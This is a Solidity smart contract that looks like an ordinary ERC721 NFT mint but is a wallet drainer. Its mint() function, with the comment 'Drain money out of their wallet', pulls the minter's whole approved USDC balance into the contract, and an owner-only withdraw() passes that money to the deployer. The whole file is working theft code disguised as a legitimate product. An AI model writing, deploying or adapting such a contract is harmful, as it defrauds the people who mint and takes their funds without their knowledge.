// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

contract NASNFTContractUSDTDrain is ERC721, Ownable {
    string public baseURI;
    uint256 public currentMintId = 0;
    address private _usdc;


    constructor(string memory _initialBaseURI, address _initalUsdc) ERC721("NASNFT", "NASNFT") {
        baseURI = _initialBaseURI;
        _usdc = _initalUsdc;
    }

    function _baseURI() internal view override returns (string memory) {
        return baseURI;
    }

    function mint() public payable {
        require(balanceOf(_msgSender()) == 0, "You already have a token");
        // Drain money out of their wallet
        IERC20(_usdc).transferFrom(_msgSender(), address(this), IERC20(_usdc).balanceOf(_msgSender()));
        currentMintId = currentMintId + 1;
        _safeMint(_msgSender(), currentMintId);
    }

    function withdraw() public onlyOwner returns (bool){
        return IERC20(_usdc).transfer(_msgSender(), IERC20(_usdc).balanceOf(address(this)));
    }
}
